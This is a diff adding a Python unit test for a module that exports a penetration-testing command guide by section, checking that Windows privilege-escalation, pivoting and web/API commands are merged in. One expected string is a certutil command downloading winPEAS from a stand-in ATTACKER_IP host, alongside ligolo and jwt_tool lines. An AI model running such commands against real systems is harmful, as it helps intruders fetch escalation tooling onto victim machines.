@@ -57,6 +57,18 @@ class ExportWebContentTests(unittest.TestCase):
         self.assertIn("gobuster dir", commands)
         self.assertIn("gobuster vhost", commands)
 
+    def test_full_guide_commands_are_merged_into_existing_sections(self):
+        payload = export_web_content.build_payload(export_web_content.load_source_sections())
+
+        windows = next(section for section in payload["sections"] if section["slug"] == "windows-privesc")
+        pivoting = next(section for section in payload["sections"] if section["slug"] == "pivoting")
+        web = next(section for section in payload["sections"] if section["slug"] == "web-y-apis")
+
+        self.assertIn("certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe", windows["commands"])
+        self.assertIn("sudo ip tuntap add user $USER mode tun ligolo", pivoting["commands"])
+        self.assertIn("jwt_tool TOKEN", web["commands"])
+        self.assertGreaterEqual(payload["stats"]["totalCommands"], 200)
+
     def test_phase_is_inferred_from_primary_topic_before_broad_tags(self):
         payload = export_web_content.build_payload(
             [
